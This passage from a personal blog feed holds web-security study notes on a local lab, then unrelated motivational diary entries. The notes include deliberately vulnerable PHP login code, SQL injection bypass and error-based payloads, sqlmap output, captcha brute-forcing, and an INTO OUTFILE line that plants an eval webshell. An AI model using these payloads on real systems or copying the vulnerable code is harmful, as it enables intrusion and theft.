punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"login-pass"</span><span class="token punctuation">;</span>    <span class="token comment">// 失效的访问控制</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location.href='welcome.php'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"login-fail"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location.href='login.html'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><h3 id="sql注入">SQL注入</h3><ul><li>用户名单引号引发报错，暴露敏感信息</li></ul><figure><img src="https://s2.loli.net/2022/08/14/NSzVExquBcFl5t9.png"alt="image-20220814165429092" /><figcaption aria-hidden="true">image-20220814165429092</figcaption></figure><blockquote><ul><li>攻击<code>payload</code>:</li></ul></blockquote><figure><imgsrc="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220814170425490.png"alt="image-20220814170425490" /><figcaption aria-hidden="true">image-20220814170425490</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> login <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'x'</span> <span class="token operator">or</span> userid<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#'' and password = '123123';// #号后面被注释</span></code></pre><blockquote><ul><li>拼接有效</li><li>完成闭合，改变原有执行逻辑</li></ul></blockquote><ul><li>提交的用户信息明文</li></ul><h3 id="漏洞修复">漏洞修复</h3><ul><li>py对登录页面进行fuzz测试</li><li>一个错误</li></ul><figure><img src="https://s2.loli.net/2022/08/14/SUCDhczfe7BmaFG.png"alt="image-20220814183422949" /><figcaption aria-hidden="true">image-20220814183422949</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/14/aWivpyz5SfD4RcP.png"alt="image-20220814183322691" /><figcaption aria-hidden="true">image-20220814183322691</figcaption></figure><ul><li>使用session</li></ul><figure><img src="https://s2.loli.net/2022/08/14/XphYW5lEyIFJBAv.png"alt="image-20220814183734226" /><figcaption aria-hidden="true">image-20220814183734226</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/14/o1CmBYWhxzbTPMu.png"alt="image-20220814184046380" /><figcaption aria-hidden="true">image-20220814184046380</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/14/zDWbRfo8wEMFZaH.png"alt="image-20220814185409700" /><figcaption aria-hidden="true">image-20220814185409700</figcaption></figure><ul><li>用户名和密码分开判断</li></ul><figure><img src="https://s2.loli.net/2022/08/14/4q9fG2zDVbmSxT8.png"alt="image-20220814192658532" /><figcaption aria-hidden="true">image-20220814192658532</figcaption></figure><ul><li><p><code>addslashes（）</code></p></li><li><p>开启mysql临时日志</p></li><li><p>预处理防止sql注入</p></li></ul><h3 id="php操作mysql">php操作mysql</h3><ul><li>面向对象</li></ul><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// mysql面向对象</span><span class="token keyword">function</span> <span class="token function-definition function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't connect to database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SET NAMES utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token variable">$conn</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 执行sql语句</span><span class="token keyword">function</span> <span class="token function-definition function">test_mysql_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login where userid &lt; 6"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// var_dump($rows);</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$rows</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username  ="</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">",password = "</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="mysqli-预处理功能">mysqli 预处理功能</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// mysqli 预处理</span><span class="token keyword">function</span> <span class="token function-definition function">mysqli_prepare_stmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login WHERE userid &lt; ?"</span><span class="token punctuation">;</span>    <span class="token comment">// $sql = "update login set username = ? WHERE userid = ?";</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span> <span class="token variable">$userid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// $username = 'haha';</span>    <span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>    <span class="token comment">// 要查询结果还需要绑定结果参数</span>    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$userid</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$role</span><span class="token punctuation">,</span> <span class="token variable">$avatar</span><span class="token punctuation">,</span> <span class="token variable">$createtime</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$userid</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><figure><img src="https://s2.loli.net/2022/08/15/JlZNI5gxOTfduc1.png"alt="image-20220815161622192" /><figcaption aria-hidden="true">image-20220815161622192</figcaption></figure><h3 id="php-处理图片验证码">php 处理图片验证码</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getCode</span><span class="token punctuation">(</span><span class="token variable">$vlen</span><span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token variable">$width</span><span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token variable">$height</span><span class="token operator">=</span><span class="token number">25</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: image/png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$vcode</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$vlen</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$vcode</span><span class="token punctuation">;</span>    <span class="token variable">$image</span> <span class="token operator">=</span> <span class="token function">imagecreate</span><span class="token punctuation">(</span><span class="token variable">$width</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$imgColor</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">imagestring</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token variable">$vcode</span><span class="token punctuation">,</span><span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">50</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$width</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$height</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">imagedestroy</span><span class="token punctuation">(</span><span class="token variable">$image</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>​</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&#x2F;&#x2F; login.html        &lt;div style&#x3D;&quot;text-align:center;vertical-align:middel;&quot;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;vcode&quot; id&#x3D;&quot;vcode&quot;                placeholder&#x3D;&quot;验证码&quot;&gt;&nbsp;&nbsp;&lt;img src&#x3D;&quot;vcode.php&quot;&gt;        &lt;&#x2F;div&gt;</code></pre><ul><li>验证码存在的漏洞，页面不刷新，则验证码不变</li></ul><figure><img src="https://s2.loli.net/2022/08/16/cSxPjaW4FhezIiB.png"alt="image-20220816081542072" /><figcaption aria-hidden="true">image-20220816081542072</figcaption></figure><ul><li>手工生成的cookie 相当于没设验证码</li></ul><h3 id="基于百度的验证码识别">基于百度的验证码识别</h3><figure><img src="https://s2.loli.net/2022/08/16/AaO4WFRdGu2fYXr.png"alt="image-20220816090552984" /><figcaption aria-hidden="true">image-20220816090552984</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/16/KzPpTfSEOhrgc5I.png"alt="image-20220816140300349" /><figcaption aria-hidden="true">image-20220816140300349</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/16/4RiBOtdCeQW8znx.png"alt="image-20220816163111274" /><figcaption aria-hidden="true">image-20220816163111274</figcaption></figure><ul><li>burp 百度ocr</li></ul><p><ahref="https://github.com/Ta0ing/captcha-killer-java8">插件地址</a>、<ahref="https://ai.baidu.com/ai-doc/REFERENCE/Ck3dwjhhu">获取accessToken</a>、<ahref="https://console.bce.baidu.com/ai/#/ai/ocr/overview/index">应用服务</a></p><figure><img src="https://s2.loli.net/2022/08/16/1i5QhTGAVZ6mNUd.png"alt="image-20220816151029558" /><figcaption aria-hidden="true">image-20220816151029558</figcaption></figure><ul><li>密码、验证码 同时爆破</li></ul><figure><img src="https://s2.loli.net/2022/08/16/kUAIBrEF8qZJlea.png"alt="image-20220816162923833" /><figcaption aria-hidden="true">image-20220816162923833</figcaption></figure><ul><li><p>使用python 代码更好</p></li><li><p>登录次数限制防爆破</p></li></ul><figure><img src="https://s2.loli.net/2022/08/16/F4VkMRiLqYBw56r.png"alt="image-20220816165025354" /><figcaption aria-hidden="true">image-20220816165025354</figcaption></figure><p>​</p><figure><img src="https://s2.loli.net/2022/08/16/4vJ8M9I75TxhmdF.png"alt="image-20220816165245401" /><figcaption aria-hidden="true">image-20220816165245401</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/16/Q2ckygnbvFStJ98.png"alt="image-20220816165811063" /><figcaption aria-hidden="true">image-20220816165811063</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/16/GBDcJXgMUv9eoqp.png"alt="image-20220816170406697" /><figcaption aria-hidden="true">image-20220816170406697</figcaption></figure><h3 id="sql-注入">sql 注入</h3><ul><li><figure><img src="https://s2.loli.net/2022/08/17/OxtHg6TYPZ5BvMC.png"alt="image-20220817151945664" /><figcaption aria-hidden="true">image-20220817151945664</figcaption></figure></li></ul><figure><img src="https://s2.loli.net/2022/08/17/G1ZdzF4kl3SDuXi.png"alt="image-20220817152135729" /><figcaption aria-hidden="true">image-20220817152135729</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/17/nhuy2oDqfmd64Bz.png"alt="image-20220817153301306" /><figcaption aria-hidden="true">image-20220817153301306</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/17/MmV9yLQsepvZUK5.png"alt="image-20220817153514937" /><figcaption aria-hidden="true">image-20220817153514937</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/17/zWywmdPHFRQEoO4.png"alt="image-20220817160542645" /><figcaption aria-hidden="true">image-20220817160542645</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/17/4VH2uaY7iOprK5h.png"alt="image-20220817161315069" /><figcaption aria-hidden="true">image-20220817161315069</figcaption></figure><h3 id="sql-木马植入">Sql 木马植入</h3><ul><li></li></ul><p><img src="https://s2.loli.net/2022/08/17/WfZjuRbK2IidpE9.png"alt="image-20220817224418189" />**</p><figure><img src="https://s2.loli.net/2022/08/17/Hrc9gZ1azftDEyC.png"alt="image-20220817171831132" /><figcaption aria-hidden="true">image-20220817171831132</figcaption></figure><h3 id="远程控制工具">远程控制工具</h3><ol type="1"><li>中国菜刀 （不支持新版本php)</li></ol><ul><li>查看读的权限</li></ul><figure><img src="https://s2.loli.net/2022/08/17/PZcdDsIlHtmrLV2.png"alt="image-20220817222635768" /><figcaption aria-hidden="true">image-20220817222635768</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">2</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST['a']);?>"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">"/opt/lampp/htdocs/security/temp/mm.php"</span></code></pre><figure><img src="https://s2.loli.net/2022/08/17/4pgKba2EBVYy5sW.png"alt="image-20220817230147427" /><figcaption aria-hidden="true">image-20220817230147427</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/18/9bST5DZjAdGRBLw.png"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><ul><li>post 请求单独</li><li>get 请求搜索引擎框</li></ul><figure><img src="https://s2.loli.net/2022/08/18/prMJd76Isyk2mOY.png"alt="https://s2.loli.net/2022/08/18/prMJd76Isyk2mOY.png" /><figcaptionaria-hidden="true">https://s2.loli.net/2022/08/18/prMJd76Isyk2mOY.png</figcaption></figure><ul><li>冰蝎</li></ul><figure><img src="https://s2.loli.net/2022/08/18/KPF4YoatGnB2Di9.png"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><h3 id="报错注入">报错注入</h3><figure><img src="https://s2.loli.net/2022/08/18/9wlSvDMxL1NWQeP.png"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'learn'</span> <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><figure><img src="https://s2.loli.net/2022/08/18/6eflZSQYPyxTswF.png"alt="image.png" /><figcaption aria-hidden="true">image.png</figcaption></figure><pre class="language-sql" data-language="sql"><code class="language-sql">extravalue<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="盲注">盲注</h3><ol type="1"><li>boolean型</li></ol><blockquote><ul><li>length()</li><li>substr()</li><li>mid()</li></ul></blockquote><ol start="2" type="1"><li>时间型盲注</li></ol><blockquote><ul><li>sleep()</li></ul></blockquote><h3 id="sqlmap">sqlmap</h3><pre class="language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;192.168.104.130&#x2F;security&#x2F;php&#x2F;read.php?id&#x3D;2</code></pre><p><img src="https://s2.loli.net/2022/08/18/SU6IEye1iOTg4YJ.png" /></p><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">2</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3844</span> <span class="token keyword">FROM</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token function">COUNT</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x717a627671</span><span class="token punctuation">,</span><span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6b7a71</span><span class="token punctuation">,</span>FLOOR<span class="token punctuation">(</span>RAND<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">FROM</span> INFORMATION_SCHEMA<span class="token punctuation">.</span>PLUGINS <span class="token keyword">GROUP</span> <span class="token keyword">BY</span> x<span class="token punctuation">)</span>a<span class="token punctuation">)</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql">id<span class="token operator">=</span><span class="token number">2</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">3104</span> <span class="token keyword">FROM</span> <span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>EbAM<span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">id&#x3D;-4370 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a627671,0x4e454f6441584c6150544863676e42486e6c464b416a536e6c74635174596452494f487354527969,0x717a6b7a71),NULL,NULL-- -</code></pre><figure><img src="https://s2.loli.net/2022/08/18/QzsqnSLXf2ij8KR.png"alt="image-20220818192647936" /><figcaption aria-hidden="true">image-20220818192647936</figcaption></figure><h3 id="更新注入">更新注入</h3><figure><img src="https://s2.loli.net/2022/08/19/iV51yNCxjMkreK6.png"alt="image-20220819115211360" /><figcaption aria-hidden="true">image-20220819115211360</figcaption></figure><h3 id="堆叠注入">堆叠注入</h3><figure><img src="https://s2.loli.net/2022/08/19/hdr5TNCKFqDyuwU.png"alt="image-20220819121734036" /><figcaption aria-hidden="true">image-20220819121734036</figcaption></figure><figure><img src="https://s2.loli.net/2022/08/19/lnyD9XCArvGt4mK.png"alt="image-20220819121815109" /><figcaption aria-hidden="true">image-20220819121815109</figcaption></figure><h3 id="二次注入">二次注入</h3><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191516860.png"alt="image-20220819151657795" /><figcaption aria-hidden="true">image-20220819151657795</figcaption></figure><h3 id="宽字节注入">宽字节注入</h3><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191526348.png"alt="image-20220819152650259" /><figcaption aria-hidden="true">image-20220819152650259</figcaption></figure><ul><li><code>GBK</code>、<code>组合</code></li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191540031.png"alt="image-20220819154004956" /><figcaption aria-hidden="true">image-20220819154004956</figcaption></figure><ul><li>url 解码注入</li></ul><h3 id="奇技淫巧">奇技淫巧</h3><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191600909.png"alt="image-20220819160005801" /><figcaption aria-hidden="true">image-20220819160005801</figcaption></figure><h3 id="代码与命令注入">代码与命令注入</h3><ol type="1"><li><code>eval()</code></li><li><code>assert()</code></li><li><code>preg_replace()</code></li><li><code>create_function()</code> 创建匿名函数</li><li><code>firewall--cmd</code> 命令 后添加： <code>reload</code></li></ol><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191734110.png"alt="image-20220819173426977" /><figcaption aria-hidden="true">image-20220819173426977</figcaption></figure><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191736727.png"alt="image-20220819173623660" /><figcaption aria-hidden="true">image-20220819173623660</figcaption></figure><h3 id="http-头注">http 头注</h3><ul><li>php全局函数获取信息（如原始ip）</li></ul><figure><imgsrc="https://cdn.jsdelivr.net/gh/liuhaihuaAACC/pictureBed/img/202208191753742.png"alt="image-20220819175337638" /><figcaption aria-hidden="true">image-20220819175337638</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Cybersecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I like</title>
      <link href="/2022/08/10/sui-bian-shuo-dian-shi-me/"/>
      <url>/2022/08/10/sui-bian-shuo-dian-shi-me/</url>
      
        <content type="html"><![CDATA[<h3 id="section">2023-06-07</h3><ul><li>多思考如何做好一件事</li></ul><h3 id="section-1">2023-06-04</h3><ul><li><p>坚定最自己的自信</p></li><li><p>坚定、决心、义无反顾、三秒的思考</p></li><li><p>对于一件事，你只需三秒钟决定做不做，而决定做不做，完全取决于你不做是否后悔</p><p>如果你想做，那么一切阻拦都是纸老虎</p><p>而如果你给自己找各种理由去设法让自己不做，这是懦夫的表现</p></li></ul><h3 id="section-2">2023-06-02</h3><ul><li>低预期</li><li>我就是我</li><li>平静、不断思考、思考</li><li>坚定、坚决，心无杂念</li><li>给予</li></ul><h3 id="section-3">2023-05-26</h3><ul><li><p>最佳的状态</p><p>自然、轻松、平静、自信、毫无顾虑</p></li><li><p><strong>专注</strong>当下的每分每秒</p></li><li><p>任何时刻产生自我怀疑都是极大的错误</p></li></ul><h3 id="section-4">2023-05-16</h3><ul><li>能在关键的时刻保持我的最佳状态即可，三秒的思考时间足矣。</li></ul><h3 id="section-5">2023-04-26</h3><ul><li>平静、耐心、享受过程</li></ul><h3 id="section-6">2023-04-16</h3><ul><li>坚定、坚决，敏捷的思维与行动</li></ul><h3 id="section-7">2023-04-14</h3><ul><li>状态、热身</li><li>平静、随和、自然、幽默，再怯懦的时候，只需要一鼓作气即刻行动</li><li>延伸和拓展，而不是询问；我的价值在哪，我该怎样呈现这些</li><li>我做这些的目的只有一个，价值和体现自己的价值，在这个过程中，一切阻挠我都需要克服</li></ul><h3 id="section-8">2023-04-06</h3><ul><li>重要的事，那就得在好的状态下做</li><li>如果一个人从不忙碌到忙碌，这已经发生了点什么</li><li>如何专注到最主要的事情上呢</li></ul><h3 id="section-9">2023-04-03</h3><ul><li>轻松写意的行事与有条不紊的思绪应该是我目前的最佳状态了吧</li><li>任何时刻怀疑与否定之前的自己都是极其错误的，波澜不惊地整理自己的思绪总是对的</li></ul><h3 id="section-10">2023-03-18</h3><ul><li>每天起来：刷完牙，洗完脸都应该问自己：我现在状态怎么样？我该以怎样的状态度过这一天？</li><li>我需要保持身体的舒适和心理的愉悦</li></ul><h3 id="section-11">2023-02-08</h3><ul><li><figure><img src="https://s2.loli.net/2023/02/08/iEjX3h6C8xFcko2.png"alt="image-20230208013645942" /><figcaption aria-hidden="true">image-20230208013645942</figcaption></figure></li><li>如何长期坚持一件事，而不是一时热枕呢</li></ul><h3 